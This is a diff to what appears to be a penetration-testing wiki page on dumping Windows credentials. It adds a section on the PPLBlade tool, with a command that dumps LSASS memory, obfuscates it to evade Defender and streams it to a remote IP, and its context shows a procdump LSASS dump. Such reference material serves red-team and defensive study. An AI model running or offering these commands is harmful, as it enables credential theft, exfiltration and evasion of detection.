@@ -122,6 +122,22 @@ Get-Process -Name LSASS
 .\procdump.exe -ma 608 lsass.dmp
 ```
 
+## Dumpin lsass with PPLBlade
+
+[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) is a Protected Process Dumper Tool that support obfuscating memory dump and transferring it on remote workstations without dropping it onto the disk.
+
+**Key functionalities**:
+
+1. Bypassing PPL protection
+2. Obfuscating memory dump files to evade Defender signature-based detection mechanisms
+3. Uploading memory dump with RAW and SMB upload methods without dropping it onto the disk (fileless dump)
+
+{% code overflow="wrap" %}
+```bash
+PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
+```
+{% endcode %}
+
 ## CrackMapExec
 
 ### Dump SAM hashes
@@ -321,8 +337,6 @@ Download it from:[ http://www.tarasco.org/security/pwdump\_7](http://www.tarasco
 ## Defenses
 
 [**Learn about some credentials protections here.**](credentials-protections.md)
-
-
 
 <details>
 
